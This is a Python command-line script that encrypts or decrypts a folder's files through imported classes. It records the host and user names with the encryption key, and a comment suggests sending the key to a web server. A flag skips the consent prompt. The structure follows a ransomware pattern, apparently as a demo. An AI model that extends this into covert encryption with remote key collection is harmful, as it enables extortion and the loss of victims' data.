import os
import argparse
from Encryptor import Encryptor
from Decryptor import Decryptor

if __name__ == "__main__":
    # Configure parser
    parser = argparse.ArgumentParser(description="This tool encrypt or decrypt files.",
                                    formatter_class=argparse.ArgumentDefaultsHelpFormatter)

    # Add filter on folder to encrypt/decrypt
    parser.add_argument("-f", "--folder", required=True,
                        help="which folder should be encrypted/decrypted")
    # Add encrypt boolean
    parser.add_argument("-r", "--recursive", action="store_true",
                        help="tells if the folder selected should be encrypted recursively")
    # Add decryption key
    parser.add_argument("-k", "--key",
                        help="specified decryption key, if given, \
                            decryption mode is activated, other wise it will be encryption")
    # Add boolean to not manually check the encryption process
    parser.add_argument("-y", "--consent", action="store_true",
                        help="if selected, user won't be prompted for consent before encryption")

    # Get args
    args = parser.parse_args()
    folder = args.folder
    recursive = args.recursive
    key = args.key
    consent = args.consent

    if not key:
        if not consent:
            answer = input("Are you sure you wanna encrypt your files ? (y) : ")
            if answer != "y":
                exit("Abborting, please enter 'y' if you want to encrypt.")
        # process to encryption
        encryptor = Encryptor(
            computer_name=os.uname().nodename if hasattr(os, 'uname') else os.getenv('COMPUTERNAME'),
            user_name=os.getenv('USER') or os.getenv('USERNAME'),
            folder=folder,
            recursive=recursive
        )
        encryptor.encrypt_files()
        # Send the key to a web server for example, to decrypt files later
        print(f'[{encryptor.computer_name}\\{encryptor.user_name}] -> {encryptor.encryption_key}')
    else:
        # process to decryption
        decryptor = Decryptor(
            decryption_key=key,
            folder=folder,
            recursive=recursive
        )
        decryptor.decrypt_files()
